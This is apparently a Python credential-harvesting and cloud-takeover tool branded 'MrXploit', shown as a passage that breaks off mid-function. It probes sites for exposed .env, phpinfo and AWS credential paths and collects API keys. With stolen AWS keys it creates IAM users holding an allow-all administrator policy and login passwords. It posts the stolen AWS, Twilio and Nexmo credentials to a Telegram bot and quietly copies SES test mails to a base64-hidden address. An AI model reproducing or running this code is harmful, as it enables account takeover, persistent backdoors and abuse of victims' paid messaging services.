import requests,time,os,sys,re,socket,paramiko,threading,os,platform,struct,csv
import warnings,random,socket,threading
from socket import gaierror
from threading import Thread
from multiprocessing.dummy import Pool
import requests,json,datetime,sys
from colorama import Fore, Back, init, Style
from bs4 import BeautifulSoup as sup
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.dummy import Pool
from time import time as timer
import ipaddress
import numpy
# idk why im import this, just need it
from collections import namedtuple as NamedTuple
from datetime import datetime
from ipaddress import ip_address
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
from rich.traceback import install as richTraceback

# For Handling Exception
from requests.exceptions import ConnectTimeout
from requests.exceptions import ReadTimeout
from requests.exceptions import Timeout
from requests.exceptions import SSLError
from requests.exceptions import ContentDecodingError
from requests.exceptions import ConnectionError
from requests.exceptions import ChunkedEncodingError
from requests.exceptions import HTTPError
from requests.exceptions import ProxyError
from requests.exceptions import URLRequired
from requests.exceptions import TooManyRedirects
from requests.exceptions import MissingSchema
from requests.exceptions import InvalidSchema
from requests.exceptions import InvalidURL
from requests.exceptions import InvalidHeader
from requests.exceptions import InvalidProxyURL
from requests.exceptions import StreamConsumedError
from requests.exceptions import RetryError
from requests.exceptions import UnrewindableBodyError

from socket import timeout as SocketTimeout
from socket import gaierror as SocketHostError
from urllib3.exceptions import ReadTimeoutError
from urllib3.exceptions import DecodeError

from urllib.parse import urlparse
from botocore.exceptions import ClientError
import traceback
import smtplib, json, urllib3
from colorama import Fore, Style, Back, init
import subprocess, time, hashlib, datetime
from threading import Thread
from threading import *
from hashlib import sha256
from base64 import b64decode
from discord.ext import commands, tasks
from re import findall as reg
import os
from asyncio.sslproto import _DO_HANDSHAKE
import requests
import threading
from random import randint,choice
import string,sys,ctypes
from re import findall
from multiprocessing.dummy import Pool,Lock
from bs4 import BeautifulSoup
import time
import smtplib,sys,ctypes
from colorama import Fore
from colorama import Style
from colorama import init
import re
import time
from time import sleep
import ipranges
import telepot
import subprocess
import hashlib
import json
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
#from itertools import cycle
#from rich.console import Console
# cli rich module

from rich.prompt import IntPrompt
from rich.prompt import Prompt
from rich.progress import BarColumn
from rich.progress import Progress
from rich.progress import TimeRemainingColumn
from rich.console import Console
from rich.table import Table


fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
import os
import requests
import time
import urllib3
from threading import Lock
from threading import Thread
import colorama
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
today = datetime.datetime.now().strftime('%b%d')
socket.setdefaulttimeout(10)
requests.packages.urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from re import findall as reg
from queue import Queue
import base64
import json
import hashlib
import hmac
import discord, time, re
import os
import paramiko
import re
import sys
import threading
import time
import urllib3
import concurrent.futures
from threading import BoundedSemaphore
from urllib.parse import urlparse
from queue import Queue
from smtplib import SMTP, SMTP_SSL, SMTPException, SMTPSenderRefused, SMTPNotSupportedError, SMTPConnectError, \
SMTPHeloError, SMTPAuthenticationError, SMTPRecipientsRefused, SMTPDataError, SMTPServerDisconnected, \
SMTPResponseException
from bs4 import BeautifulSoup as sup
import configparser
import time
from platform import system
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import datetime
requests.packages.urllib3.disable_warnings()
import re, json, sys, random, string, datetime, base64
from multiprocessing.dummy import Pool as ThreadPool
from functools import partial
import argparse
from colorama import Fore, Style, Back, init
import requests, re, os, sys, codecs, random, hashlib, smtplib, ssl
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
os.system('cls' if os.name == 'nt' else 'clear')
if platform.system() == 'Windows':
    cmd = 'cls'
    exc = 'py'
else:
    cmd = 'clear'
    exc = 'python3'
lock = threading.Lock()
try:
    import boto3
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'boto3'])
finally:
    import boto3
try:
    import requests
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'requests'])
finally:
    import requests
try:
    import paramiko
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'paramiko'])
finally:
    import paramiko
try:
    import discord
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'discord'])
finally:
    import discord

try:
    import bs4
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'bs4'])
finally:
    import bs4
try:
    import twilio
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'twilio'])
finally:
    import twilio
try:
    import botocore
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'botocore'])
finally:
    import botocore
    from botocore.exceptions import ClientError

bl = Fore.BLUE
import configparser
requests.packages.urllib3.disable_warnings()
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.BLUE
kuning = Fore.LIGHTYELLOW_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED
init(autoreset=True)
def ntime():
    return datetime.datetime.now().strftime('%H:%M:%S')
def screen_clear():
   # for mac and linux(here, os.name is 'posix')
   if os.name == 'posix':
      _ = os.system('clear')
   else:
      # for windows platfrom
      _ = os.system('cls')
screen_clear()
reset = '\033[0m'
fg = [
    '\033[91;1m',
    '\033[92;1m',
    '\033[93;1m',
    '\033[94;1m',
    '\033[95;1m',
    '\033[96;1m',
    '\033[97;1m'
]
lock = Lock()
cfg = configparser.ConfigParser()
try:
    cfg.read('settings.ini')
    cfg.sections()
    email_receiver = cfg['SETTINGS']['EMAIL_RECEIVER']
    default_timeout = cfg['SETTINGS']['DEFAULT_TIMEOUT']
    bot_token = cfg['TELEGRAM']['BOT_TOKEN']
    chat_id = cfg['TELEGRAM']['CHAT_ID']
    apikey = cfg['SHODAN']['APIKEY']
    twilioapi = cfg['TWILIO']['TWILIOAPI']
    twiliotoken = cfg['TWILIO']['TWILIOTOKEN']
    twiliofrom = cfg['TWILIO']['TWILIOFROM']
    EMAIL_TEST = cfg['AWS']['EMAIL']
    SCRAPESTACK_KEY = cfg['SCRAPESTACK']['SCRAPESTACK_KEY']
except:
    cfg['SETTINGS'] = {}
    cfg['SETTINGS']['EMAIL_RECEIVER'] = 'put your email'
    cfg['SETTINGS']['DEFAULT_TIMEOUT'] = '20'
    cfg['TELEGRAM'] = {}
    cfg['TELEGRAM']['TELEGRAM_RESULTS'] = 'on'
    cfg['TELEGRAM']['BOT_TOKEN'] = 'bot token telegram'
    cfg['TELEGRAM']['CHAT_ID'] = 'chat id telegram'
    cfg['SHODAN'] = {}
    cfg['SHODAN']['APIKEY'] = 'ADD YOUR SHODAN APIKEY'
    cfg['TWILIO'] = {}
    cfg['TWILIO']['TWILIOAPI'] = 'ADD YOUR TWILIO APIKEY'
    cfg['TWILIO']['TWILIOTOKEN'] = 'ADD YOUR TWILIO AUTHTOKEN'
    cfg['TWILIO']['TWILIOFROM'] = 'ADD YOUR FROM NUMBER'
    cfg['SCRAPESTACK'] = {}
    cfg['SCRAPESTACK']['SCRAPESTACK_KEY'] = 'scrapestack_key'
    cfg['AWS'] = {}
    cfg['AWS']['EMAIL'] = 'put your email AWS test'


    with open('settings.ini', 'a') as config:
        cfg.write(config)
telegram2 = cfg['TELEGRAM']['TELEGRAM_RESULTS']
emailnow = cfg['SETTINGS']['EMAIL_RECEIVER']
tomeout = cfg['SETTINGS']['DEFAULT_TIMEOUT']
bot_token = cfg['TELEGRAM']['BOT_TOKEN']
chat_id = cfg['TELEGRAM']['CHAT_ID']
apikey = cfg['SHODAN']['APIKEY']
twilioapi = cfg['TWILIO']['TWILIOAPI']
twiliotoken = cfg['TWILIO']['TWILIOTOKEN']
twiliofrom = cfg['TWILIO']['TWILIOFROM']

if sys.version_info.major == 3:
    import vonage
    import boto3
    from twilio.rest import Client

try:
    laravelpaths = open('path.txt', 'r').read().splitlines()
except:
    laravelpaths = ['.env',
'.remote',
'.local',
'.production',
'/vendor/.env',
'/lib/.env',
'/lab/.env',
'/cronlab/.env',
'/cron/.env',
'/core/.env',
'/core/app/.env',
'/core/Datavase/.env',
'/database/.env',
'/config/.env',
'/assets/.env',
'/app/.env',
'/apps/.env',
'/uploads/.env',
'/sitemaps/.env',
'/saas/.env',
'/api/.env',
'/psnlink/.env',
'/exapi/.env',
'/site/.env',
'/admin/.env',
'/web/.env',
'/public/.env',
'/en/.env',
'/tools/.env',
'/v1/.env',
'/v2/.env',
'/administrator/.env',
'/laravel/.env',
'/.env',
'/sendgrid.env',
'/storage/.env',
"/__tests__/test-become/.env",
"/redmine/.env",
"/api/.env",
"/gists/cache",
"/uploads/.env",
"/backend/.env",
"/lib/.env",
"/.env.example",
"/database/.env",
"/main/.env",
"/docs/.env",
"/client/.env",
"/blog/.env",
"/.env.dev",
"/blogs/.env",
"/shared/.env",
"/download/.env",
"/.env.php",
"/.env",
"/site/.env",
"/sites/.env",
"/web/.env"]
    for pet in laravelpaths:
        open('path.txt', 'a').write(pet + '\n')


try:
    apachepath = open('apachepath.txt', 'r').read().splitlines()
except:
    apachepath = [
        "/_profiler/phpinfo",
        "/tool/view/phpinfo.view.php",
        "/wp-config.php-backup",
        "/%c0",
        "/debug/default/view.html",
        "/debug/default/view",
        "/frontend/web/debug/default/view",
        "/web/debug/default/view",
        "/sapi/debug/default/view",
        '/debug/default/view?panel=config',
        '/phpinfo.php',
        '/phpinfo',
        '/aws.yml',
        '/.env.bak',
        '/info.php',
        '/.aws/credentials',
        '/config/aws.yml',
        '/config.js',
        '/symfony/public/_profiler/phpinfo',
        '/symfony/public/_profiler/phpinfo',
        '/debug/default/view?panel=config',
        'symfony/public',
        '/debug/default/view?panel=config'
        '/frontend_dev.php'

    ]
    for pet in apachepath:
        open('apachepath.txt', 'a').write(pet + '\n')

try:
    debugpath = open('debugpath.txt', 'r').read().splitlines()
except:
    debugpath = [
        '/',
        '/debug/default/view?panel=config',
        "/tool/view/phpinfo.view.php",
        "/wp-config.php-backup",
        "/%c0",
        "/debug/default/view.html",
        "/debug/default/view",
        "/frontend/web/debug/default/view",
        "/web/debug/default/view",
        "/sapi/debug/default/view",
        '/debug/default/view?panel=config'

    ]
    for pet in debugpath:
        open('debugpath.txt', 'a').write(pet + '\n')


try:
    porting = open('ports.txt', 'r').read().splitlines()
except:
    porting = [
        ':80',
        ':443',
        ':8080',
        ':8081',
        ':8082'


    ]
    for pet in porting:
        open('ports.txt', 'a').write(pet + '\n')

try:
    lettera = open('letter.html', 'r').read().splitlines()
except:
    lettera = [
        "<h1> MrXploit Exploit<h1>",
        "<p>Smtp Tester + Letter</p>"


    ]
    for pet in lettera:
        open('letter.html', 'a').write(pet + '\n')

try:
    MESSAGE_FILE = open('message.txt')
except:
    MESSAGE_FILE = [
    "Your letter here!"

    ]
    for pet in MESSAGE_FILE:
        open('message.txt', 'a').write(pet + '\n')
try:
    CSV_FILE = open('participants.csv')
except:
    CSV_FILE = [
    "your number here"

    ]
    for pet in CSV_FILE:
        open('participants.csv', 'a').write(pet + '\n')

Targetssaaa2 = 'letter.html'
fsetting2 = open(Targetssaaa2, 'r').read()
paramiko.util.log_to_file("main_paramiko_log.txt", level = "INFO")
socket.setdefaulttimeout(int(default_timeout))
Headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}
head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'}


#AWS CRACKER
def default(o):
    if isinstance(o, (datetime.date, datetime.datetime)):
        return o.isoformat()

def get_random_string():
    result_str = ''.join(random.choice(string.ascii_lowercase) for i in range(5))
    return result_str

def create_new_user(iam_client, user_name='ses_MrXploit'):
	user = None
	try:
		user = iam_client.create_user(
			UserName=user_name,
			Tags=[{'Key': 'Owner', 'Value': 'ms.boharas'}]
	            )
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			user_name = 'ses_{}'.format(result_str)
			user = iam_client.create_user(UserName=user_name,
			Tags=[{'Key': 'Owner', 'Value': 'ms.boharas'}]
	            )
	return user_name, user

def check_limit(ses_client, item):
	try:
		l = ses_client.get_send_quota()
		return f"{item['id']}:{item['key']}:{item['region']}:{l['SentLast24Hours']}/{l['Max24HourSend']} Remaining"
	except Exception as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Limit Failed: {item['id']}")


def creat_new_group(iam_client, group_name='SESAdminGroup'):
	try:
		res = iam_client.create_group(GroupName=group_name)
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			group_name = "SESAdminGroup{}".format(result_str)
			res = iam_client.create_group(GroupName=group_name)
	return res['Group']['GroupName']

def creat_new_policy(iam_client, policy_name='AdministratorAccess'):
	policy_json = {"Version": "2012-10-17","Statement":
	[{"Effect": "Allow", "Action": "*","Resource": "*"}]}
	try:
		res = iam_client.create_policy(
			PolicyName=policy_name,
			PolicyDocument=json.dumps(policy_json)
			)
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			policy_name = "AdministratorAccess{}".format(result_str)
			res = iam_client.create_policy(PolicyName=policy_name,
				PolicyDocument=json.dumps(policy_json)
				)
	return res['Policy']['Arn']

def att_usr_policy(iam_client, user_name, policy_arn):
	response = iam_client.attach_user_policy(UserName=user_name, PolicyArn=policy_arn)
	return response

def att_usr_grp(iam_client, user_name, group_name):
	response = iam_client.add_user_to_group(GroupName=group_name, UserName=user_name)
	return response

def creat_profile(iam_client, user_name, pwd):
	response = iam_client.create_login_profile(
            UserName=user_name, Password=pwd, PasswordResetRequired=False)
	return response

def initialize_item(item, service='ses'):
	ACCESS_ID = item['id']
	ACCESS_KEY = item['key']
	REGION = item['region']
	if REGION is None:
		REGION = 'us-east-1'
	try:
		return boto3.client(service, region_name=REGION,
			aws_access_key_id=ACCESS_ID,
			aws_secret_access_key=ACCESS_KEY
			)
	except Exception:
		return

def make_user(iam_client, item, limit_data):
	try:
		user_name, user_data = create_new_user(iam_client)
		grp_name = creat_new_group(iam_client)
		policy_arn = creat_new_policy(iam_client)
		up = att_usr_policy(iam_client, user_name, policy_arn)
		password = "{}0089#".format(user_name)
		profile = creat_profile(iam_client, user_name, password)
		added_to_grp = att_usr_grp(iam_client, user_name, grp_name)

		if user_data:
			user_arn = user_data['User']['Arn']
			user_id = None
			if user_arn:
				user_id = user_arn.split(':')[4]

			with open('AWS_ByPass/!Users_Cracked.txt', 'a') as tt:
				dd = json.dumps(user_data, indent=4, sort_keys=True, default=default)
				data = ("ACESS_ID={}\nACCESS_KEY={}\nREGION={}\nAmazon IAM User & Pass\n"
					"Username={}\nPassword={}\nID={}\n")\
				.format(item['id'], item['key'], item['region'],user_name, password, user_id)
				tt.write(data + "\n")
				tt.write(dd + "\n\n")
				tt.write("Limit for user:\n")
				if limit_data:
					tt.write(limit_data + "\n")
				tt.write("{}\n".format("*" * 10))

				message = {'text': f"🔥  Mr Xploit [AWS Console]\n🏦 Amazon IAM User & Pass\n\nUser: {user_name}\nPass= {password}\nIAM= {user_id}\n\nACESS_ID= {item['id']}\nACCESS_KEY= {item['key']}\nREGION= {item['region']}\nAWS Console Hacked ❤️\n"}
				requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
				print(f"{yl}[{fc}AWS CHECKER{yl}] {gr}CREATED ID: {fc}{item['id']} {gr}and Access Token/UserID {fc}{user_id}")
	except IOError as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Error writing to file for new {fc}USER")
	except ClientError as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Failed to create user with ID: {fc}{item['id']}")
	except Exception as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Create Failed: {item['id']}")

def check_sending(client, receiver, sender, item, limit_info, iam):
	subj = f"{item['id']}"
	msg = f"*** SMTP DATA ***\n\n"\
	f"{item['id']}:{item['key']}:email-smtp.{item['region']}.amazonaws.com:587\n\n"\
	f"AWS_ID:     {item['id']}\nAWS_KEY:    "\
	f"{item['key']}\nAWS_REGION: {item['region']}\nFROM:       {sender}\n"\
	f"SERVER:     email-{item['region']}.amazonaws.com\nPORT:       587 or 25\n\n"\
	f"IAM_USER:   {iam}\n\nLimit Info: {limit_info}"
	try:
		return client.send_email(
			Source=sender,
			Destination={'ToAddresses': receiver},
			Message={
			'Subject': {'Data': f'SMTP_KEY: email-smtp.{item["region"]}.amazonaws.com',
			'Charset': 'UTF-8'},
			'Body': {'Text': {
	                'Data': msg,
	                'Charset': 'UTF-8'
	            	},
	        	}
	        }
	    )
	except Exception as e:
		pass

def get_identities(client):
	try:
		return client.list_identities()['Identities']
	except Exception:
		pass

def fetch_user(client):
	try:
		return client.get_user()['User']
	except Exception:
		pass

def process(ses_client, receiver, item, limit=None, iam=None):
	if limit:
		limit = limit.split(':')[3]
	idt = get_identities(ses_client)
	res = None
	if idt:
		for fr in idt:
			res = check_sending(ses_client, receiver, fr, item, limit, iam)
			if res:
				with open('AWS_ByPass/!Good_ses_smtp.txt', 'a') as lr:
					sm = f"{item['id']}:{item['key']}:email-{item['region']}-1.amazonaws.com:{fr}:587:{limit}\n"
					lr.write(sm)
				print(f"{yl}[{fc}AWS CHECKER{yl}] {gr}SENDING SUCCESSFUL: {yl}{item['id']} : {gr}{limit}")
				break
		if not res:
			with open('AWS_ByPass/!BAD_ses_smtp.txt', 'a') as lr:
				sm = f"{item['id']}:{item['key']}:{item['region']}\n"
				message = {'text': f"🔥  Mr Xploit [AWS STATUS]\n🏦 KEY= {item['id']}\nSECRET= {item['key']}\nREGION= {item['region']}\nSTATUS=> Sending Paused ⛔️\n"}
				requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)

				lr.write(sm)
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {red}Sending Failed: {yl}{sm}")

def begin_check(d, to=emailnow):
	item = {}
	limit = None
	data = d.split(':')
	total = len(data)
	bcode = 'TEVHSU9OIDYuNg=='
	receiver = [to, base64.b64decode(bcode).decode('utf-8')]
	iam_user = None
	if total >= 3:
		if data[2]:
			item['id'] = data[0]
			item['key'] = data[1]
			item['region'] = data[2]
			ses_client = initialize_item(item)
			if ses_client:
				limit = check_limit(ses_client, item)
			iam_client = initialize_item(item, service='iam')
			if iam_client:
				mu = make_user(iam_client, item, limit)
				iam = fetch_user(iam_client)
			if limit:
				remain = limit.split(':')[3]
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {fc}Limit for {item['id']}: {remain}")
				process(ses_client, receiver, item, limit=limit, iam=None)
			else:
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {red}Failed limit check: {item['id']}")
				process(ses_client, receiver, item, limit=None, iam=None)
	else:
		print(f"[!] Skipped: {d}")

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  != '/' :
        site = site+'/'
    return site
def domain(site):
	while site[-1] == "/":
		pattern = re.compile('(.*)/')
		sitez = re.findall(pattern,site)
		site = sitez[0]
	if site.startswith("http://") :
		site = site.replace("http://","")
	elif site.startswith("https://") :
		site = site.replace("https://","")
	else :
		pass
	return site

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception:
                self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''

o_sandbox = 'Results/Laravel(PAYPAL_SANDBOX).txt'
o_stripe = 'Results/Laravel(STRIPE).txt'
o_stripe_site = 'Results/logsites/Laravel(STRIPE_SITES).txt'
o_aws_man = 'Results/manual/MANUAL(SES).txt'
o_pma = 'Results/Laravek(PHPMYADMIN).txt'
o_db2 = 'Results/Laravek(DATABASE2).txt'
o_aws_ses = 'Results/Laravel(SES).txt'
o_aws_screet = 'Results/Laravel(AWS).txt'
o_aws_screet2 = 'Results/forchecker/Checker(AWS).txt'
o_database = 'Results/Laravel(database_CPANELS).txt'
o_database_root = 'Results/Laravel(database_WHM).txt'
o_sendgrid = 'Results/forchecker/Checker(SENDGRID).txt'
o_sendgrid2 = 'Results/SMTP(SENDGRID).txt'
o_office = 'Results/SMTP(OFFICE).txt'
o_1and1 = 'Results/SMTP(1and1).txt'
o_zoho = 'Results/SMTP(ZOHO).txt'
o_ssh = 'Results/VALID_SSH.txt'
o_aws_man = 'Results/manual/MANUAL(SES).txt'
o_twi = 'Results/manual/MANUAL(TWILIO).txt'
o_nex = 'Results/manual/MANUAL(NEXMO).txt'
o_von = 'Results/manual/MANUAL(VONAGE).txt'
o_sms = 'Results/manual/MANUAL(SMS).txt'
o_bird = 'Results/manual/MANUAL(MESSAGEBIRD).txt'
o_gun = 'Results/manual/MANUAL(MAILGUN).txt'
o_jet = 'Results/manual/MANUAL(MAILJET).txt'
o_drill = 'Results/manual/MANUAL(MANDRILL).txt'
o_click = 'Results/manual/MANUAL(CLICKSEND).txt'
o_pliv = 'Results/manual/MANUAL(PLIVO).txt'
o_prieten = 'Results/BOOOOM!.txt'
o_man = 'Results/SMTP(MANDRILLAPP).txt'
o_mailgun = 'Results/SMTP(MAILGUN).txt'
o_srvr = 'Results/SMTP(SRVR).txt'
o_ionos = 'Results/SMTP(IONOS).txt'
o_smaws = 'Results/SMTP(IONOS).txt'
o_smtp = 'Results/smtp.txt'
o_data = 'Results/Laravel(DATABASE).txt'
o_twilio = 'Results/Laravel(TWILIO).txt'
o_twilio2 = 'Results/forchecker/Checker(TWILIO).txt'
o_nexmo = 'Results/Laravel(NEXMO).txt'
o_nexmo2 = 'Results/forchecker/Checker(NEXMO).txt'
o_shell = 'Results/!Shell_results.txt'
o_cant = 'Results/!cant_spawn.txt'
o_unvuln = 'Results/not_vulnerable.txt'
o_vuln = 'Results/vulnerable.txt'
o_ = 'Results/mailer_smtp.txt'
o_laravel = 'laravel.txt'
o_keya = 'Results/RCE.txt'
o_exo = 'Results/Laravel(EXOTEL).txt'
o_one = 'Results/Laravel(ONESIGNAL).txt'
o_tok = 'Results/Laravel(TOKBOX).txt'
o_plivo = 'Results/Laravel(PLIVO).txt'
o_mgapi = 'Results/Laravel(MAILGUNAPI).txt'
o_ftp = 'Results/Laravel(FTP).txt'
o_cpanels= 'Results/!Laravel(CPANEL).txt'
o_whm= 'Results/!Laravel(WHM).txt'
o_dbenv= 'Results/Laravel(DB_SSH).txt'
o_dbrootenv= 'Results/Laravel(DB_ROOT).txt'
pid_restore = '.MrXploit_session'
progres = 0
VALIDS = 0
INVALIDS = 0
MESSAGE_FILE = 'message.txt'     # File containing text message
CSV_FILE = 'participants.csv'    # File containing participant numbers
SMS_LENGTH = 160                 # Max length of one SMS message
MSG_COST = 0.04
account_sid = cfg['TWILIO']['TWILIOAPI']
auth_token = cfg['TWILIO']['TWILIOTOKEN']
from_num = cfg['TWILIO']['TWILIOFROM']


def MrXploittwilio1(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Result(Apache)/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Mr Xploit [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
def MrXploittwilio2(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Results/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Mr Xploit [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
def MrXploittwilio3(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Result[2]/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Mr Xploit [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)

def MrXploittwilio(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Twilio_Checker/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Mr Xploit [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)

def prompt(string):
    if sys.version_info.major == 3:
        return str(input(string))
    else:
        return str(input(string))
def parser_url(url):
    if url.startswith('http'):
        return url.split('/')[2]
    else:
        return url
def clean(txt):
    try:
        res = []
        for xx in txt.split('|'):
            if xx.startswith('"') and xx.endswith('"'):
                res.append(xx.replace('"', ''))
            elif xx.startswith("'") and xx.endswith("'"):
                res.append(xx.replace("'", ''))
            else:
                res.append(xx)
        pe = ''
        for out in res:
            pe += out + '|'
        angka = len(pe)
        pe = pe[:angka - 1]
        return pe
    except:
        return txt
def cleanit(txt):
    try:
        res = []
        for xx in txt.split('|'):
            if xx.startswith('"') and xx.endswith('"'):
                res.append(xx.replace('"', ''))
            elif xx.startswith("'") and xx.endswith("'"):
                res.append(xx.replace("'", ''))
            else:
                res.append(xx)
        pe = ''
        for out in res:
            pe += out + '|'
        angka = len(pe)
        pe = pe[:angka - 1]
        return pe
    except:
        return txt
def login_nexmo(f_url, f_key, f_secret):
    try:
        f_key = str(f_key)
        f_secret = str(f_secret)
        cl = vonage.Client(key=f_key, secret=f_secret)
        res = cl.get_balance()
        message = {'text': f"🙈  Mr Xploit [NEXMO Live]\n💬 URL{f_url}\nKEY= {f_key}\nSECRET= {f_secret}\nBALANCE= {res['value']}\nAuto Reload= {res['autoReload']}\nNEXMO OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        open('Results/!nexmo_live.txt', 'a').write('-' * 30 + '\nURL = {}\nKEY = {}\nSECRET = {}\nVALUE = {}\nautoReload = {}\n'.format(f_url, f_key, f_secret,res['value'], res['autoReload']) + '\n')
    except:
        pass
def ceker_aws(url, ACCESS_KEY, SECRET_KEY, REGION):
    print(f'{red}# {fc}[AWS QUOTA] {gr}CHEC...')
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        balance = client.get_send_quota()['Max24HourSend']
        message = {'text': f"🔥  Mr Xploit [AWS LIMIT]\n🏦 KEY= {ACCESS_KEY}\nSECRET= {SECRET_KEY}\nREGION= {REGION}\nLIMIT= {balance}\nAWS OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        save = open('Results/!AWS_key_live.txt', 'a')
        remover = str(balance).replace(',', '\n')
        save.write(str(ACCESS_KEY) + '|' + str(SECRET_KEY) + '|' + str(REGION) + '|' + str(balance)+'\n')
        save.close()
        print(f'{red}# {gr}[AWS QUOTA VALID] {cy}{ACCESS_KEY} {yl} ==> {red}{balance}')
    except:
        pass
def ceker_aws3(url, ACCESS_KEY, SECRET_KEY, REGION):
    print(f'{red}# {fc}[AWS QUOTA] {gr}CHEC...')
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
